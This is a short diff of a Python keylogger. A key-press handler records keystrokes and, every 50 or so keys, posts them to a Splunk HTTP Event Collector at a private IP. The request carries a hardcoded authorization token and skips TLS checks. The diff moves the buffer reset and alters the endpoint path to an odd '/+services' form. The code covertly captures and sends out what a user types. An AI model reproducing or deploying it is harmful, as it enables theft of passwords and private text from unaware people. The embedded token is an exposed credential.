@@ -13,7 +13,7 @@ async def post_request():
     global recording
     data = ''.join(recording)
     data = "{{\"event\":\"word={0}\"}}".format(data)
-    url = "https://192.168.50.234:8088/services/collector/event"
+    url = "https://192.168.50.234:8088/+services/collector/event"
     headers = {'Authorization': 'Splunk 24FD4388-F0DC-4036-A058-146DC4FA637B'}
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
         response = await session.post(
@@ -36,10 +36,10 @@ def on_press(key):
     if count > 50:
         try:
             asyncio.run(post_request())
+            count = 0
+            recording = []
         except:
             pass
-        count = 0
-        recording = []
     return False
 
 
